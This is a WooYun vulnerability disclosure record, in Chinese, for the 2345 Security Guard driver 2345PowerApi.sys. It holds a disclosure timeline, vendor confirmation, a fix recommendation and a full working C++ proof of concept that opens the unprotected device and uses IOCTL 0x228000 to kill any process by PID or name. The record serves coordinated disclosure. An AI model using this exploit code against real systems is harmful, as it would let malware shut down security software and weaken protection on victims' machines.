{"id": 19955, "wybug_id": "wooyun-2015-0106602", "wybug_title": "2345安全卫士PowerApi驱动内核权限杀任意进程漏洞", "wybug_corp": "2345网址导航", "wybug_author": "Wstone", "wybug_date": "2015-04-09 14:45", "wybug_open_date": "2015-07-08 15:44", "wybug_type": "权限提升", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["驱动权限提升"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-08：\t细节向公众公开  简要描述： 软件版本：1.3.0.5363问题原因：2345PowerApi.sys没有做打开校验，任意程序可以通过DeviceIoControl操作这个驱动，包括但不限于杀任意进程。 详细说明：  \n\n   漏洞证明：  \n// 2345.cpp : 定义控制台应用程序的入口点。//#include \"stdafx.h\"#include <windows.h>#include <vector>using namespace std;#include<tlhelp32.h>#define DEVICENAME L\"\\\\\\\\.\\\\2345PowerApi\"void PrintErrCodeMessage(char *preMsg){\tLPVOID lpMsgBuf;\tDWORD dwErrorCode = GetLastError();\tif(NULL!=preMsg)\t\tprintf(\"%s\\n\",preMsg);\tif(FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, //dwFlags\t\tNULL, //lpSource\t\tdwErrorCode, //dwMessageId\t\tMAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\t\t(LPSTR)&lpMsgBuf, //lpBuffer\t\t0, //nSize\t\tNULL //Arguments\t\t))\t{\t\tprintf(\"Fail Code: %d\\r\\n\", dwErrorCode);\t\tprintf(\"Fail Message: %s\\r\\n\", lpMsgBuf);\t}else{\t\tprintf(\"Fail Code: %d\\r\\n\", dwErrorCode);\t\tprintf(\"Failed to fetch the Error Message\\r\\n\");\t}\tprintf(\"Open Device Failed!\\r\\n\");\tif(lpMsgBuf)\t\tLocalFree(lpMsgBuf);\treturn;}int TerminateByPid(DWORD dwPid){\tchar szOutBuf[100] = {0};\tDWORD nOutLen = sizeof(szOutBuf);\tHANDLE hDevice = CreateFileW( DEVICENAME , GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL );\tif(hDevice == INVALID_HANDLE_VALUE){\t\tPrintErrCodeMessage(\"[CreateFileA]\");\t\tgoto end;\t}else{\t\tprintf(\"Open Device Success!\\r\\n\");\t}\tprintf(\"press any key to continue!\\n\");\tgetchar();\tBOOL ret = DeviceIoControl(hDevice,   \t\t0x228000,\t\t&dwPid,\t\tsizeof(dwPid),\t\tszOutBuf,\t\t\t// out_buffer\t\tnOutLen,\t\t// out_buffer_len = 0\t\t&nOutLen,\t//  \t\tNULL);\tif(!ret) { \t\tPrintErrCodeMessage(\"[DeviceIoControl]\");\t\tgoto end;\t}\telse\t\tprintf(\"DeviceIoControl Successed!\\n\");end:    CloseHandle(hDevice);\treturn 0;}BOOL GetPidsByNameLike(IN char szProcName[],OUT vector<DWORD> &vPids){\tif(NULL==szProcName)\t\treturn FALSE;\tHANDLE hProcessSnap = NULL;\tPROCESSENTRY32 pe32= {0};\thProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\tif (hProcessSnap == (HANDLE)-1)\t{\t\treturn FALSE;\t}\tpe32.dwSize = sizeof(PROCESSENTRY32);\tif(Process32First(hProcessSnap, &pe32))\t{\t\tdo\t\t{\t\t\tif(NULL!=strstr(pe32.szExeFile,szProcName))\t\t\t{\t\t\t\tvPids.push_back(pe32.th32ProcessID);\t\t\t}\t\t}while (Process32Next(hProcessSnap, &pe32));\t}\tCloseHandle (hProcessSnap);\treturn TRUE;}int TerminateByNL(char szNL[]){\tvector<DWORD> vPids;\tchar szOutBuf[100] = {0};\tDWORD nOutLen = sizeof(szOutBuf);\tHANDLE hDevice = CreateFileW( DEVICENAME , GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL );\tif(hDevice == INVALID_HANDLE_VALUE){\t\tPrintErrCodeMessage(\"[CreateFileA]\");\t\tgoto end;\t}else{\t\tprintf(\"Open Device Success!\\r\\n\");\t}\tprintf(\"press any key to continue!\\n\");\tgetchar();\tGetPidsByNameLike(szNL,vPids);\tfor(int i=0;i<vPids.size();i++)\t{\t\tDWORD dwPid = vPids[i];\t\tprintf(\"NL:%s , Pid:%u\\n\",szNL,vPids[i]);\t\tBOOL ret = DeviceIoControl(hDevice,   \t\t\t0x228000,\t\t\t&dwPid,\t\t\tsizeof(dwPid),\t\t\tszOutBuf,\t\t\t// out_buffer\t\t\tnOutLen,\t\t// out_buffer_len = 0\t\t\t&nOutLen,\t//  \t\t\tNULL);\t\tif(!ret) { \t\t\tPrintErrCodeMessage(\"[DeviceIoControl]\");\t\t\tgoto end;\t\t}\t\telse\t\t\tprintf(\"DeviceIoControl Successed!\\n\");\t}end:\tCloseHandle(hDevice);\treturn 0;}void Useage(){\tprintf(\"使用方法，如下例子：\\n\");\tprintf(\"  2345terminate -pid xxx\\n\");\tprintf(\"  2345terminate -namelike xxx\\n\");}int _tmain(int argc, _TCHAR* argv[]){    if(argc!=3)\t{\t\tUseage();\t\treturn -1;\t}\tif(0==strcmp(argv[1],\"-pid\"))\t\tTerminateByPid(atoi(argv[2]));\telse if(0==strcmp(argv[1],\"-namelike\"))\t\tTerminateByNL(argv[2]);\telse\t{\t\tUseage();\t\treturn -1;\t}\treturn 0;}\n   修复方案：  做好驱动的打开校验   版权声明：转载请注明来源 Wstone@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-04-09 15:43 厂商回复： 感谢您对2345的关注，我们会在下一版本中修复此问题 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}